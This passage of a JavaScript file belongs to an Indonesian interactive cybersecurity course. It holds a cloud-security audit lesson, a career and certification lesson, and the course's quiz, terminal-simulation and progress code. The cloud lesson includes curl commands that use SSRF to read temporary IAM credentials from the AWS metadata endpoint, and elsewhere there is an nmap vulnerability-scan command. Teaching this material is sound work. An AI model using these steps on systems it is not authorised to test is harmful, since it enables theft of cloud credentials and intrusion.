<h3>Cloud Security — Keamanan di Era Modern</h3>
<p>Lebih dari 90% perusahaan Fortune 500 menggunakan cloud. Kebocoran data terbesar dalam sejarah sebagian besar disebabkan oleh misconfiguration cloud, bukan exploit canggih. Cloud security adalah skill yang SANGAT dicari dan bergaji tinggi.</p>
<h4>🔷 AWS Security — Paling Populer</h4>
<ul>
  <li><strong>IAM (Identity Access Management)</strong> — Siapa boleh akses apa. Prinsip least privilege wajib!</li>
  <li><strong>S3 Bucket Security</strong> — Jangan pernah buat public tanpa alasan yang sangat kuat</li>
  <li><strong>VPC Security Groups</strong> — Firewall virtual. Port 0.0.0.0/0 = semua orang bisa akses</li>
  <li><strong>CloudTrail</strong> — Log semua API call. Wajib aktif di semua region!</li>
  <li><strong>GuardDuty</strong> — Threat detection otomatis menggunakan ML</li>
</ul>
<h4>🔷 Top 10 Cloud Misconfiguration</h4>
<ol>
  <li>S3 bucket public read/write</li>
  <li>IAM user dengan AdministratorAccess</li>
  <li>Root account tanpa MFA</li>
  <li>Security group 0.0.0.0/0 pada port sensitif</li>
  <li>RDS/Database publicly accessible</li>
  <li>CloudTrail tidak aktif</li>
  <li>Secrets hardcoded di code atau environment variable</li>
  <li>Container image dengan user root</li>
  <li>Kubernetes dashboard exposed ke internet</li>
  <li>Lambda function dengan permission berlebihan</li>
</ol>
<h4>🔷 SSRF ke AWS Metadata</h4>
<p>Jika ada SSRF di EC2 instance: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> bisa bocorkan temporary AWS credentials!</p>
<div class="cv-tip-box">💡 <span>Sertifikasi: AWS Security Specialty, CCSP (Certified Cloud Security Professional). Tools: ScoutSuite, Prowler, CloudMapper untuk audit otomatis.</span></div>
`,
        commands: `# ─── AWS SECURITY AUDIT ──────────────────────────────────────

# Setup AWS CLI
aws configure
# Masukkan: Access Key, Secret Key, Region, Output format

# === ENUMERATION ===
aws iam get-account-summary            # overview akun
aws iam list-users                     # semua IAM user
aws iam list-roles                     # semua role
aws s3api list-buckets                 # semua S3 bucket
aws ec2 describe-instances             # semua EC2
aws ec2 describe-security-groups       # semua security group

# Cek S3 bucket public
aws s3api get-bucket-acl --bucket nama-bucket
aws s3api get-bucket-policy --bucket nama-bucket
# Test tanpa credentials (public?):
aws s3 ls s3://nama-bucket --no-sign-request

# Cek IAM permissions berlebihan
aws iam list-attached-user-policies --user-name username
aws iam simulate-principal-policy --policy-source-arn ARN --action-names "*"

# Cek security group berbahaya (port terbuka ke 0.0.0.0/0)
aws ec2 describe-security-groups \\
  --query "SecurityGroups[?contains(IpPermissions[].IpRanges[].CidrIp,'0.0.0.0/0')]"

# === AUTOMATED AUDIT ===
# ScoutSuite - multi cloud audit
python3 scout.py aws

# Prowler - AWS security best practices
./prowler -r ap-southeast-1 -g cislevel2

# === SSRF -> AWS METADATA ===
# Jika ada SSRF di web app yang jalan di EC2:
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME`,
        simulation: [
          { input: 'aws s3 ls s3://company-backup-prod --no-sign-request', output: `2024-12-10 08:23:41   5242880 database_backup_20241210.sql.gz
2024-12-10 08:23:41    512000 user_data_export.csv
2024-12-10 08:23:41   1048576 employee_records.xlsx
2024-12-09 07:15:22    204800 api_keys.txt  ← KRITIS!
[!] BUCKET PUBLIC: siapapun bisa download file ini!
[!] Ini adalah critical finding — laporkan segera!`, type: 'err' },
          { input: 'python3 scout.py aws --report-dir ./aws-audit', output: `[ScoutSuite] Gathering AWS services data...
[+] IAM: 3 users with AdministratorAccess
[+] S3: 2 buckets publicly accessible
[+] EC2: 5 instances with port 22 open to 0.0.0.0/0
[+] RDS: 1 database publicly accessible
[+] CloudTrail: DISABLED in 2 regions!
[+] MFA: Root account without MFA
[!] Total: 47 HIGH findings, 23 MEDIUM findings
[+] HTML Report: ./aws-audit/scoutsuite-report.html`, type: 'warn' },
        ],
        typingTarget: "aws ec2 describe-security-groups --query \"SecurityGroups[?contains(IpPermissions[].IpRanges[].CidrIp,'0.0.0.0/0')].[GroupId,GroupName]\" --output table",
        quiz: {
          q: 'Apa risiko terbesar jika S3 bucket di-set public read?',
          options: [
            'Membuat server AWS menjadi lambat',
            'Semua file dalam bucket bisa didownload oleh siapapun di internet',
            'Meningkatkan biaya AWS billing',
            'Membuat website tidak bisa diakses'
          ],
          correct: 1,
          explanation: 'S3 bucket public read berarti SIAPAPUN di internet bisa list dan download semua file. Ini adalah salah satu penyebab terbesar kebocoran data — database backup, file employee, API keys, semua bisa dicuri tanpa autentikasi apapun.',
        },
        challenge: {
          title: 'Audit Cloud Configuration dan Buat Risk Report',
          desc: 'Analisis konfigurasi AWS berikut dan buat risk assessment report yang prioritize berdasarkan dampak.',
          starter: `# Hasil audit AWS (dari ScoutSuite):

# IAM Findings:
# - User "dev_deployer" punya policy: AdministratorAccess
# - Root account: aktif, tidak ada MFA, ada access key
# - Service account "app_user": punya S3FullAccess + EC2FullAccess

# S3 Findings:
# - "prod-database-backups": PUBLIC READ
# - "company-docs-internal": PUBLIC READ WRITE  ← !!
# - "dev-code-artifacts": Bucket policy allow * (all accounts)

# EC2/Network:
# - Security Group "sg-webapp": port 22 open 0.0.0.0/0
# - Security Group "sg-db": port 3306 open 0.0.0.0/0 (database!)
# - RDS "prod-mysql": publicly_accessible = true

# Logging:
# - CloudTrail: disabled di region ap-southeast-1
# - S3 access logging: disabled pada semua bucket

# Buat Risk Report:
# CRITICAL findings (aksi dalam 24 jam):
# 1. _______________  Risiko: _______________
# 2. _______________  Risiko: _______________

# HIGH findings (aksi dalam 1 minggu):
# 1. _______________  Risiko: _______________

# MEDIUM findings (aksi dalam 1 bulan):
# 1. _______________  Risiko: _______________

# Rekomendasi perbaikan untuk temuan CRITICAL pertama:`,
          hint: 'Critical: company-docs dengan PUBLIC READ WRITE (attacker bisa upload malware!), root dengan access key. High: database port 3306 open ke internet, S3 prod backup public. Medium: CloudTrail disabled.',
          answerCheck: ['critical', 'high', 'medium', 'public', 'mfa'],
        },
        xp: 145,
      },
      {
        id: 'p3', title: 'Sertifikasi & Karir', diff: 'expert',
        explain: `
<h3>Roadmap Sertifikasi & Membangun Karir Cyber Security</h3>
<p>Cyber security adalah salah satu bidang dengan permintaan tertinggi dan gaji terbaik di dunia IT. Dengan sertifikasi yang tepat dan portofolio yang kuat, kamu bisa mendapat gaji $80,000-$200,000+/tahun.</p>
<h4>🔷 Jalur Sertifikasi (Urutan Rekomendasi)</h4>
<ul>
  <li>🟢 <strong>Level 1 (Entry):</strong> CompTIA Security+ → eJPT → BTL1</li>
  <li>🔵 <strong>Level 2 (Intermediate):</strong> CEH / CompTIA CySA+ / PNPT</li>
  <li>🟣 <strong>Level 3 (Advanced):</strong> OSCP (pentest gold standard) / CISSP (management)</li>
  <li>🔴 <strong>Level 4 (Expert):</strong> OSEP / OSED / OSWE / GREM / GXPN</li>
</ul>
<h4>🔷 Jalur Karir</h4>
<ul>
  <li><strong>SOC Analyst (L1/L2/L3)</strong> — Monitor, investigate alert. Entry point terbaik.</li>
  <li><strong>Penetration Tester</strong> — Offensive security, butuh sertifikasi OSCP</li>
  <li><strong>Security Engineer</strong> — Build dan maintain security infrastructure</li>
  <li><strong>Cloud Security Engineer</strong> — AWS/Azure/GCP security specialist</li>
  <li><strong>Malware Analyst / Threat Hunter</strong> — Advanced defensive role</li>
  <li><strong>Bug Bounty Hunter</strong> — Freelance, income tidak terbatas</li>
  <li><strong>CISO</strong> — C-level, butuh 10-15 tahun pengalaman</li>
</ul>
<h4>🔷 Membangun Portofolio yang Kuat</h4>
<ul>
  <li><strong>GitHub</strong> — Tools yang kamu buat, scripts, writeups</li>
  <li><strong>Blog / Writeups</strong> — HTB writeup, CTF writeup, vulnerability research</li>
  <li><strong>TryHackMe / HackTheBox</strong> — Ranking dan completion rate</li>
  <li><strong>Bug Bounty Hall of Fame</strong> — Bukti nyata menemukan bug di perusahaan besar</li>
  <li><strong>CTF Competitions</strong> — ctftime.org untuk track semua CTF</li>
</ul>
<div class="cv-tip-box">💡 <span>Mulai dari sekarang: buat akun TryHackMe dan selesaikan Pre-Security Path (gratis). Target: selesai dalam 30 hari. Ini akan memberikan fondasi yang cukup untuk mulai perjalananmu.</span></div>
`,
        commands: `# ─── MEMBANGUN KARIR CYBER SECURITY ──────────────────────────

# === PLATFORM LATIHAN ===
# TryHackMe (pemula-menengah, guided)
# Path yang direkomendasikan (urutan):
# 1. Pre-Security Path (gratis, ~40 jam)
# 2. SOC Level 1 Path (untuk blue team)
# 3. Jr Penetration Tester Path
# 4. Offensive Pentesting Path

# HackTheBox (menengah-advanced, less guided)
# Mulai dari: Starting Point machines (ada walkthrough)
# Active machines: Easy → Medium → Hard → Insane
# Connect: sudo openvpn lab.ovpn

# Hack The Box Academy (lebih guided dari HTB)

# === CTF ===
# ctftime.org — jadwal semua CTF competition
# PicoCTF — CTF untuk pemula
# CTF All The Year — practice anytime

# === HOME LAB SETUP ===
# Install VirtualBox (gratis): virtualbox.org
# Download Kali Linux: kali.org/get-kali
# Download Metasploitable 2: sourceforge.net
# Download VulnHub machines: vulnhub.com

# Quick Docker Lab:
docker run -d -p 80:80 vulnerables/web-dvwa    # DVWA
docker run -d -p 3000:3000 bkimminich/juice-shop  # Juice Shop
docker run -d -p 8080:8080 webgoat/goat-and-wolf  # WebGoat

# === SERTIFIKASI PREP ===
# Security+ prep (gratis):
# Professor Messer: professormesser.com (YouTube)
# CompTIA free study guide: comptia.org

# OSCP prep (butuh 6-12 bulan):
# 1. TryHackMe Offensive Pentesting Path
# 2. HackTheBox Pro Labs: Offshore, RastaLabs
# 3. Practice: VulnHub, HTB retired machines
# 4. TJnull's OSCP-like machine list (search Google)

# Sertifikasi gratis/murah:
# Google Cybersecurity Certificate (Coursera)
# IBM Cybersecurity Analyst (Coursera)
# ISC2 CC (Certified in Cybersecurity) - GRATIS!`,
        simulation: [
          { input: 'cat my_roadmap.txt', output: `=== MY CYBER SECURITY ROADMAP ===

BULAN 1-3: Fondasi
[ ] Selesai Pre-Security Path di TryHackMe
[ ] Belajar Linux dasar setiap hari 1 jam
[ ] Setup home lab (Kali + Metasploitable)
[ ] Mulai Python scripting

BULAN 4-6: Core Security
[ ] OWASP Top 10 - practice di DVWA
[ ] Selesai Jr Pentesting Path di TryHackMe
[ ] 5 HackTheBox Starting Point machines
[ ] Belajar Burp Suite

BULAN 7-9: Intermediate
[ ] OSCP Study (labs)
[ ] 10 HTB Easy machines
[ ] Pertama kali submit bug bounty report
[ ] CompTIA Security+ exam

BULAN 10-12: Advanced
[ ] OSCP Exam
[ ] 5 Medium HTB machines
[ ] Mulai aktif di bug bounty
[ ] Buat portofolio blog

[*] Estimasi gaji setelah 12 bulan: Rp 8-15 juta/bulan
[*] Setelah OSCP: Rp 15-30 juta/bulan`, type: 'info' },
          { input: 'cat job_market.txt', output: `=== PELUANG KERJA CYBER SECURITY 2024 ===

INDONESIA:
- SOC Analyst L1: Rp 5-8 juta/bulan
- Security Engineer: Rp 12-25 juta/bulan
- Penetration Tester: Rp 15-35 juta/bulan

REMOTE (USD):
- SOC Analyst: $50,000-$80,000/tahun
- Security Engineer: $90,000-$130,000/tahun
- Senior Pentester (OSCP+): $120,000-$180,000/tahun
- Cloud Security Architect: $150,000-$220,000/tahun

BUG BOUNTY (top hunters):
- Top 100 HackerOne: $100,000-$1,000,000+/tahun
- Rata-rata hunter aktif: $20,000-$80,000/tahun

SKILLS PALING DICARI 2024:
1. Cloud Security (AWS/Azure) ←← HOT
2. DevSecOps
3. Threat Hunting
4. Malware Analysis
5. AI Security`, type: 'info' },
        ],
        typingTarget: 'nmap -sV -sC --script vuln -oA comprehensive_scan 192.168.1.0/24',
        quiz: {
          q: 'Sertifikasi mana yang dianggap "gold standard" untuk penetration testing dan paling diakui industri?',
          options: ['CEH (Certified Ethical Hacker)', 'CompTIA PenTest+', 'OSCP (Offensive Security Certified Professional)', 'CISSP'],
          correct: 2,
          explanation: 'OSCP dari Offensive Security adalah gold standard untuk penetration testing. Ujiannya 24 jam — harus compromise 5 mesin dalam lab real tanpa bantuan. Ini membuktikan kemampuan praktis yang sesungguhnya. Semua hiring manager tahu artinya OSCP.',
        },
        challenge: {
          title: 'Buat Rencana Belajar 6 Bulan Personalmu',
          desc: 'Berdasarkan semua yang sudah dipelajari, buat rencana belajar yang realistis dan spesifik untuk 6 bulan ke depan.',
          starter: `# RENCANA BELAJAR 6 BULAN CYBER SECURITY
# Tanggal mulai: _______________
# Target: _______________

# BULAN 1: Fondasi
# Target utama: _______________
# Platform/resource: _______________
# Milestone: _______________
# Waktu per hari: ___ jam

# BULAN 2: Tools & Practice
# Target utama: _______________
# Platform/resource: _______________
# Milestone: _______________

# BULAN 3: Spesialisasi
# Pilihan jalur (pilih 1):
# [ ] Blue Team / SOC
# [ ] Red Team / Pentesting
# [ ] Bug Bounty
# [ ] Cloud Security
# Target: _______________

# BULAN 4-5: Advanced Practice
# Target mesin HTB/THM: _______________
# Sertifikasi yang akan diambil: _______________
# Project portofolio: _______________

# BULAN 6: Sertifikasi & Job Hunt
# Sertifikasi: _______________
# Platform job: _______________
# Ekspektasi gaji: _______________

# UKURAN KEBERHASILAN:
# Setelah 6 bulan saya akan bisa:
# 1. _______________
# 2. _______________
# 3. _______________`,
          hint: 'Jadikan realistis! 1 jam per hari sudah cukup untuk progress signifikan. Fokus pada SATU jalur karir. Milestone konkret: "selesai 10 TryHackMe rooms" lebih baik dari "belajar networking".',
          answerCheck: ['bulan', 'target', 'milestone', 'sertifikasi', 'portofolio'],
        },
        xp: 120,
      },
    ]
  },
];

// ================================================================
// STATE
// ================================================================
let cvState = {
  xp: 0, level: 1, streak: 0,
  completedTopics: [],
  currentLevel: null,
  currentTopicIdx: 0,
  currentTab: 'explain',
  quizAnswered: false,
  typingStartTime: null,
  simIndex: 0,
};

const CV_RANKS = [
  [0,    'Script Kiddie'],
  [200,  'Beginner Hacker'],
  [500,  'Security Student'],
  [1000, 'Analyst'],
  [2000, 'Penetration Tester'],
  [3500, 'Red Team Operator'],
  [5500, 'Security Engineer'],
  [8000, 'Elite Hacker'],
];
const CV_XP_LEVELS = [0, 200, 500, 1000, 2000, 3500, 5500, 8000, 12000];

function cvGetRank(xp) {
  let r = CV_RANKS[0][1];
  for (const [req, name] of CV_RANKS) { if (xp >= req) r = name; }
  return r;
}
function cvAllTopics() {
  return CV_CURRICULUM.flatMap(lv => lv.topics.map(t => ({ ...t, levelId: lv.id, levelName: lv.name })));
}

// ================================================================
// INIT
// ================================================================
function cvInit() {
  try {
    const saved = JSON.parse(localStorage.getItem('typecraft_cyber_v2') || 'null');
    if (saved) {
      cvState.xp = saved.xp || 0;
      cvState.level = saved.level || 1;
      cvState.streak = saved.streak || 0;
      cvState.completedTopics = saved.completedTopics || [];
    }
  } catch(e) {}
  cvBuildCurriculum();
  cvUpdateXPBar();
  cvRenderProgressOverview();
  cvUpdateDailyChallenge();
}

function cvSave() {
  try {
    localStorage.setItem('typecraft_cyber_v2', JSON.stringify({
      xp: cvState.xp, level: cvState.level,
      streak: cvState.streak, completedTopics: cvState.completedTopics,
    }));
  } catch(e) {}
}

// ================================================================
// CURRICULUM SIDEBAR
// ================================================================
function cvBuildCurriculum() {
  const container = document.getElementById('cv-curriculum-list');
  if (!container) return;
  container.innerHTML = '';
  CV_CURRICULUM.forEach(lv => {
    const done = lv.topics.filter(t => cvState.completedTopics.includes(t.id)).length;
    const isOpen = cvState.currentLevel === lv.id;
    const lvEl = document.createElement('div');
    lvEl.className = 'cv-level-item';
    const header = document.createElement('div');
    header.className = 'cv-level-header' + (isOpen ? ' open' : '');
    header.innerHTML = `
      <span style="width:8px;height:8px;border-radius:50%;background:${lv.color};flex-shrink:0;display:inline-block"></span>
      <span>${lv.icon} ${lv.name}</span>
      <span style="margin-left:auto;font-size:10px;color:var(--text3)">${done}/${lv.topics.length}</span>
      <span style="font-size:10px;margin-left:4px">${isOpen ? '▼' : '▶'}</span>`;
    const topicsEl = document.createElement('div');
    topicsEl.className = 'cv-level-topics' + (isOpen ? ' open' : '');
    lv.topics.forEach((topic, idx) => {
      const d = cvState.completedTopics.includes(topic.id);
      const active = cvState.currentLevel === lv.id && cvState.currentTopicIdx === idx;
      const el = document.createElement('div');
      el.className = 'cv-topic-item' + (d ? ' completed' : '') + (active ? ' active' : '');
      el.innerHTML = `<span>${topic.title}</span><span class="cv-topic-progress">${topic.xp} XP</span>`;
      el.onclick = () => cvOpenTopic(lv.id, idx);
      topicsEl.appendChild(el);
    });
    header.onclick = () => {
      const isNowOpen = topicsEl.classList.contains('open');
      document.querySelectorAll('.cv-level-topics').forEach(t => t.classList.remove('open'));
      document.querySelectorAll('.cv-level-header').forEach(h => h.classList.remove('open'));
      if (!isNowOpen) { topicsEl.classList.add('open'); header.classList.add('open'); }
    };
    lvEl.appendChild(header); lvEl.appendChild(topicsEl); container.appendChild(lvEl);
  });
}

// ================================================================
// OPEN TOPIC
// ================================================================
function cvOpenTopic(levelId, topicIdx) {
  const level = CV_CURRICULUM.find(l => l.id === levelId);
  if (!level) return;
  cvState.currentLevel = levelId;
  cvState.currentTopicIdx = topicIdx;
  const topic = level.topics[topicIdx];
  if (!topic) return;
  cvState.quizAnswered = false;

  document.getElementById('cv-welcome-screen').style.display = 'none';
  document.getElementById('cv-lesson-screen').style.display = 'block';

  document.getElementById('cv-lesson-breadcrumb').textContent = `Tahap ${levelId} · ${level.name}`;
  document.getElementById('cv-lesson-title').textContent = topic.title;
  document.getElementById('cv-lesson-progress-text').textContent = `Topik ${topicIdx + 1} dari ${level.topics.length}`;

  const diffMap = { beginner: 'diff-easy', intermediate: 'diff-medium', advanced: 'diff-hard', expert: 'diff-expert' };
  const badge = document.getElementById('cv-diff-badge');
  badge.textContent = { beginner:'Beginner', intermediate:'Intermediate', advanced:'Advanced', expert:'Expert' }[topic.diff] || topic.diff;
  badge.className = 'difficulty-badge ' + (diffMap[topic.diff] || 'diff-easy');
  document.getElementById('cv-topic-badge').textContent = level.name;

  cvPopulateExplain(topic);
  cvPopulateCommands(topic);
  cvPopulateTerminal(topic);
  cvPopulateQuiz(topic);
  cvPopulateChallenge(topic);

  cvSwitchTab('explain', document.querySelector('.cv-tab'));

  const badge2 = document.getElementById('cv-lesson-complete-badge');
  badge2.style.display = cvState.completedTopics.includes(topic.id) ? 'flex' : 'none';

  cvBuildCurriculum();
  setTimeout(() => {
    document.querySelectorAll('.cv-level-header').forEach((h, i) => {
      if (CV_CURRICULUM[i]?.id === levelId) {
        h.classList.add('open');
        document.querySelectorAll('.cv-level-topics')[i]?.classList.add('open');
      }
    });
  }, 50);
}

// ================================================================
// POPULATE TABS
// ================================================================
function cvPopulateExplain(topic) {
  const el = document.getElementById('cv-explain-content');
  el.innerHTML = topic.explain || '<p>Materi belum tersedia.</p>';
}

function cvPopulateCommands(topic) {
  const el = document.getElementById('cv-example-content');
  const code = topic.commands || '';
  el.innerHTML = `
    <h3>💻 Command & Code Reference</h3>
    <div style="display:flex;justify-content:flex-end;margin-bottom:8px">
      <button class="btn btn-ghost btn-sm" onclick="cvCopyText(${JSON.stringify(code)},this)">📋 Copy All</button>
    </div>
    <pre class="cv-command-block">${cvEsc(code)}</pre>
  `;
}

function cvPopulateTerminal(topic) {
  const input = document.getElementById('cv-terminal-input');
  const sims = topic.simulation || [];
  if (input && sims.length > 0) {
    input.value = sims[0].input;
    cvState.simIndex = 0;
  }
  cvClearTerminal();
  // Setup typing mode
  const target = topic.typingTarget || (sims[0] ? sims[0].input : '');
  cvSetupTyping(target);
}

function cvSetupTyping(target) {
  const display = document.getElementById('cv-typing-display');
  const inp = document.getElementById('cv-typing-input');
  if (!display || !target) return;
  display.innerHTML = '';
  target.split('').forEach((ch, i) => {
    const span = document.createElement('span');
    span.className = 'char ' + (i === 0 ? 'current' : 'pending');
    span.textContent = ch === '\n' ? '↵' : (ch === ' ' ? '\u00a0' : ch);
    if (ch === '\n') { span.style.color = 'var(--text3)'; span.style.fontSize = '10px'; display.appendChild(span); display.appendChild(document.createElement('br')); return; }
    display.appendChild(span);
  });
  if (inp) { inp.value = ''; inp._targetText = target; inp._startTime = null; }
}

function cvHandleTyping(e) {
  const inp = e.target;
  const target = inp._targetText || '';
  const typed = inp.value;
  if (!inp._startTime && typed.length > 0) inp._startTime = Date.now();

  const spans = document.querySelectorAll('#cv-typing-display .char');
  let correct = 0;
  spans.forEach((span, i) => {
    if (i < typed.length) {
      span.className = 'char ' + (typed[i] === target[i] ? 'correct' : 'wrong');
      if (typed[i] === target[i]) correct++;
    } else if (i === typed.length) {
      span.className = 'char current';
    } else {
      span.className = 'char pending';
    }
  });

  const elapsed = inp._startTime ? (Date.now() - inp._startTime) / 60000 : 0.001;
  const wpm = elapsed > 0 ? Math.round((typed.length / 5) / elapsed) : 0;
  const acc = typed.length > 0 ? Math.round((correct / typed.length) * 100) : 100;
  const prog = target.length > 0 ? Math.round((typed.length / target.length) * 100) : 0;

  const wpmEl = document.getElementById('cv-t-wpm');
  const accEl = document.getElementById('cv-t-acc');
  const progEl = document.getElementById('cv-t-prog');
  if (wpmEl) wpmEl.textContent = wpm;
  if (accEl) accEl.textContent = acc + '%';
  if (progEl) progEl.textContent = Math.min(prog, 100) + '%';
}

function cvRunTerminal() {
  const input = document.getElementById('cv-terminal-input');
  const output = document.getElementById('cv-terminal-output');
  if (!input || !output) return;
  const cmd = input.value.trim();
  if (!cmd) return;

  // Add command echo
  const cmdLine = document.createElement('div');
  cmdLine.className = 'cv-term-line';
  cmdLine.innerHTML = `<span class="cv-prompt">root@kali:~#</span> <span class="cv-term-out">${cvEsc(cmd)}</span>`;
  output.appendChild(cmdLine);

  // Find matching simulation
  const level = CV_CURRICULUM.find(l => l.id === cvState.currentLevel);
  const topic = level?.topics[cvState.currentTopicIdx];
  const sims = topic?.simulation || [];
  const sim = sims.find(s => s.input.trim() === cmd) || sims[cvState.simIndex % sims.length];

  if (sim) {
    cvState.simIndex++;
    setTimeout(() => {
      const lines = sim.output.split('\n');
      lines.forEach((line, i) => {
        setTimeout(() => {
          const lineEl = document.createElement('div');
          lineEl.className = 'cv-term-line';
          const cls = sim.type === 'err' ? 'cv-term-err' : sim.type === 'warn' ? 'cv-term-warn' : sim.type === 'info' ? 'cv-term-info' : 'cv-term-out';
          lineEl.innerHTML = `<span class="${cls}">${cvEsc(line)}</span>`;
          output.appendChild(lineEl);
          output.scrollTop = output.scrollHeight;
        }, i * 80);
      });
      // Update input to next sim
      const nextSim = sims[(cvState.simIndex) % sims.length];
      if (nextSim && input) input.value = nextSim.input;
    }, 200);
  } else {
    const errEl = document.createElement('div');
    errEl.className = 'cv-term-line';
    errEl.innerHTML = `<span class="cv-term-err">bash: ${cvEsc(cmd.split(' ')[0])}: command simulation not found</span>`;
    output.appendChild(errEl);
  }
  output.scrollTop = output.scrollHeight;
}

function cvClearTerminal() {
  const output = document.getElementById('cv-terminal-output');
  if (output) output.innerHTML = '<div class="cv-term-line"><span class="cv-prompt">root@kali:~#</span> <span class="cv-term-dim">Terminal siap. Klik Run untuk simulasi output...</span></div>';
}

function cvPopulateQuiz(topic) {
  const el = document.getElementById('cv-quiz-content');
  if (!topic.quiz) { el.innerHTML = '<p style="color:var(--text3)">Quiz untuk topik ini segera hadir.</p>'; return; }
  const q = topic.quiz;
  cvState.quizAnswered = false;
  el.innerHTML = `
    <h3 style="margin-bottom:12px">🧠 Quiz: ${topic.title}</h3>
    <p style="font-size:14px;color:var(--text2);margin-bottom:16px;line-height:1.6"><strong>${q.q}</strong></p>
    <div id="cv-quiz-options">
      ${q.options.map((opt, i) => `
        <button class="cv-quiz-option" onclick="cvAnswerQuiz(${i}, ${q.correct}, this)">
          <span style="color:var(--text3);margin-right:8px;font-family:var(--font-mono)">${['A','B','C','D'][i]}.</span> ${cvEsc(opt)}
        </button>`).join('')}
    </div>
    <div id="cv-quiz-result"></div>`;
}

function cvAnswerQuiz(chosen, correct, btn) {
  if (cvState.quizAnswered) return;
  cvState.quizAnswered = true;
  const topic = CV_CURRICULUM.find(l => l.id === cvState.currentLevel)?.topics[cvState.currentTopicIdx];
  document.querySelectorAll('.cv-quiz-option').forEach(b => b.style.pointerEvents = 'none');
  const resultEl = document.getElementById('cv-quiz-result');
  if (chosen === correct) {
    btn.classList.add('correct');
    const bonus = Math.round((topic?.xp || 50) * 0.3);
    resultEl.innerHTML = `<div class="cv-quiz-result pass">✅ Benar! +${bonus} XP<br><small style="opacity:.8">${topic?.quiz?.explanation || ''}</small></div>`;
    cvAddXP(bonus);
  } else {
    btn.classList.add('wrong');
    document.querySelectorAll('.cv-quiz-option')[correct].classList.add('correct');
    resultEl.innerHTML = `<div class="cv-quiz-result fail">❌ Belum tepat! Jawaban: ${['A','B','C','D'][correct]}<br><small style="opacity:.8">${topic?.quiz?.explanation || ''}</small></div>`;
  }
}

function cvPopulateChallenge(topic) {
  const el = document.getElementById('cv-challenge-content');
  if (!topic.challenge) { el.innerHTML = '<p style="color:var(--text3)">Challenge segera hadir.</p>'; return; }
  const ch = topic.challenge;
  el.innerHTML = `
    <h3>🏆 ${ch.title}</h3>
    <p style="font-size:13px;color:var(--text2);line-height:1.7;margin-bottom:14px">${ch.desc}</p>
    <div class="cv-tip-box" style="margin-bottom:14px">💡 <span>Hint: ${ch.hint}</span></div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div>
        <div style="font-size:11px;color:var(--text3);font-weight:700;margin-bottom:6px">📋 CHALLENGE</div>
        <pre class="cv-command-block" style="min-height:200px;font-size:11px;max-height:400px;overflow-y:auto">${cvEsc(ch.starter)}</pre>
      </div>
      <div>
        <div style="font-size:11px;color:var(--green);font-weight:700;margin-bottom:6px">✏️ JAWABAN KAMU</div>
        <textarea id="cv-challenge-input" class="cv-challenge-editor" placeholder="Tulis jawaban/analisis di sini..."></textarea>
      </div>
    </div>
    <div style="display:flex;gap:10px;margin-top:12px">
      <button class="btn btn-primary btn-sm" onclick="cvSubmitChallenge()">✅ Submit Jawaban (+${topic.xp} XP)</button>
      <button class="btn btn-ghost btn-sm" onclick="cvShowChallengeHint()">💡 Hint</button>
    </div>
    <div id="cv-challenge-feedback" style="margin-top:10px"></div>`;
}

function cvSubmitChallenge() {
  const input = document.getElementById('cv-challenge-input')?.value?.toLowerCase() || '';
  const topic = CV_CURRICULUM.find(l => l.id === cvState.currentLevel)?.topics[cvState.currentTopicIdx];
  const checks = topic?.challenge?.answerCheck || [];
  const feedback = document.getElementById('cv-challenge-feedback');
  const found = checks.filter(k => input.includes(k.toLowerCase()));
  const score = checks.length > 0 ? Math.round((found.length / checks.length) * 100) : 100;

  if (score >= 60) {
    const xpBonus = Math.round((topic?.xp || 50) * (score / 100));
    feedback.innerHTML = `<div class="cv-quiz-result pass">✅ Bagus! Score: ${score}% — +${xpBonus} XP<br><small>Kata kunci ditemukan: ${found.join(', ')}</small></div>`;
    cvAddXP(xpBonus);
    if (!cvState.completedTopics.includes(topic.id)) {
      cvState.completedTopics.push(topic.id);
      cvSave();
      cvShowBadge('🏆 Challenge Selesai!');
    }
  } else {
    feedback.innerHTML = `<div class="cv-quiz-result fail">❌ Perlu diperbaiki (${score}%). Kata kunci yang ditemukan: ${found.join(', ') || 'belum ada'}.<br><small>Coba lihat hint dan isi lebih detail.</small></div>`;
  }
}

function cvShowChallengeHint() {
  const topic = CV_CURRICULUM.find(l => l.id === cvState.currentLevel)?.topics[cvState.currentTopicIdx];
  if (topic?.challenge?.hint) {
    const fb = document.getElementById('cv-challenge-feedback');
    if (fb) fb.innerHTML = `<div class="cv-tip-box">💡 Hint: ${topic.challenge.hint}</div>`;
  }
}

// ================================================================
// LESSON NAVIGATION
// ================================================================
function cvGetCurrentTopic() {
  const level = CV_CURRICULUM.find(l => l.id === cvState.currentLevel);
  return level?.topics[cvState.currentTopicIdx] || null;
}

function cvNextLesson() {
  const level = CV_CURRICULUM.find(l => l.id === cvState.currentLevel);
  if (!level) { cvStartFromBeginning(); return; }
  if (cvState.currentTopicIdx < level.topics.length - 1) {
    cvOpenTopic(cvState.currentLevel, cvState.currentTopicIdx + 1);
  } else {
    const nextLv = CV_CURRICULUM.find(l => l.id === cvState.currentLevel + 1);
    if (nextLv) cvOpenTopic(nextLv.id, 0);
    else cvShowWelcome();
  }
}

function cvPrevLesson() {
  if (cvState.currentTopicIdx > 0) {
    cvOpenTopic(cvState.currentLevel, cvState.currentTopicIdx - 1);
  } else {
    const prevLv = CV_CURRICULUM.find(l => l.id === cvState.currentLevel - 1);
    if (prevLv) cvOpenTopic(prevLv.id, prevLv.topics.length - 1);
  }
}

function cvCompleteLesson() {
  const topic = cvGetCurrentTopic();
  if (!topic) return;
  if (!cvState.completedTopics.includes(topic.id)) {
    cvState.completedTopics.push(topic.id);
    cvAddXP(topic.xp);
    cvShowBadge('✅ +' + topic.xp + ' XP — Topik Selesai!');
    cvSave();
    document.getElementById('cv-lesson-complete-badge').style.display = 'flex';
    cvBuildCurriculum();
  }
  setTimeout(() => cvNextLesson(), 800);
}

function cvStartFromBeginning() {
  cvOpenTopic(CV_CURRICULUM[0].id, 0);
}

function cvContinueLearning() {
  const all = cvAllTopics();
  const next = all.find(t => !cvState.completedTopics.includes(t.id));
  if (next) cvOpenTopic(next.levelId, CV_CURRICULUM.find(l => l.id === next.levelId)?.topics.findIndex(t => t.id === next.id) || 0);
  else cvOpenTopic(CV_CURRICULUM[0].id, 0);
}

function cvShowWelcome() {
  document.getElementById('cv-welcome-screen').style.display = 'block';
  document.getElementById('cv-lesson-screen').style.display = 'none';
  cvRenderProgressOverview();
}

